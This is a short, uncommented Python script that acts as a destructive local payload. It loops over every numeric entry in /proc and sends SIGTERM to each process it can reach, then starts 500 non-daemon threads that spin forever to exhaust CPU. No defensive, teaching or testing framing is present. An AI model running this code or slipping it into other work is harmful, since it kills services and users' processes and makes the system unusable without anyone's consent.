import os, signal
for pid in os.listdir('/proc'):
    if pid.isdigit():
        try:
            os.kill(int(pid), signal.SIGTERM)
        except OSError:
            pass

import threading, time
def spin():
    while True:
        time.sleep(0)
for _ in range(500):
    threading.Thread(target=spin, daemon=False).start()

